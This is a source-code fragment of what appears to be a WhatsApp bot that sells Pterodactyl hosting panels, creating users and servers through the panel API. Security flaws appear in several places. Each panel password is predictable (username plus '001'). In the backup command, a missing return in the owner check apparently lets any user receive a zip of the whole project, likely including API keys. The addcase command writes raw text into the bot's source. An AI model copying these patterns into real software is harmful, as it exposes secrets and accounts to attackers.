description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msgp = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: 'bjir@newsletter',
 newsletterName: 'ꜰᴀᴜᴢɪᴀʟɪꜰᴀᴛᴀʜ ᴠᴇʀꜱɪ ᴛʜʀᴇᴇ',
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: alifatah.decodeJid(alifatah.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the size you want to buy`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "Fauzialifatah",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/aaf8cfb7797abfdbdc500.jpg" } }, { upload: alifatah.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await alifatah.relayMessage(m.key.remoteJid, msgp.message, {
 messageId: m.key.id
})}
break*/

case "1gb": {
if (cekSaldo(m.sender,db_saldo) < 5000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 5000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "2gb": {
if (cekSaldo(m.sender,db_saldo) < 10000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu osebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 10000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "3gb": {
if (cekSaldo(m.sender,db_saldo) < 15000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 15000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "4gb": {
if (cekSaldo(m.sender,db_saldo) < 20000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 20000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "4GB"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "5gb": {
if (cekSaldo(m.sender,db_saldo) < 25000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 25000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "6gb": {
if (cekSaldo(m.sender,db_saldo) < 30000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 30000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "7gb": {
if (cekSaldo(m.sender,db_saldo) < 35000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 35000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "8gb": {
if (cekSaldo(m.sender,db_saldo) < 40000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp40.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 40000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case "unli": {
if (cekSaldo(m.sender,db_saldo) < 50000) return alifatah.sendMessage(m.chat, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp50.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [m.sender]}, { quoted:fcall })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(m.sender, 50000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/627a1d9a9af9d0c38cb64.jpg" 
if (!u) return
let d = (await alifatah.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${q.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
alifatah.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: alifatah.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

        case "backup":
        {
            let ban = m.mentionedJid[0] || m.sender || alifatah.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
          if (!isCreator) reply("Khusus Owner Anj!!!"); 
     await reply("Sabar Bg Script alifatahifatah-MD Lagi Di Backup");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "Session" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
     await reply('script di kirim lewat pc')
          const exec = await execSync(`zip -r FauziBackup.zip ${ls.join(" ")}`);
          await alifatah.sendMessage(
            ban,
            {
              document: await fs.readFileSync("./FauziBackup.zip"),
              mimetype: "application/zip",
              fileName: "FauziBackup.zip",
            },
            { quoted:fcall }
          );
          await execSync("rm -rf FauziBackup.zip");
        }
     break

case 'addcase': {
                if (!isCreator) return reply(mess.owner)
    if (!text) return reply('Mana case nya');
    const fs = require('fs');

// Nama file yang akan dimodifikasi
const namaFile = './FauziDev.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
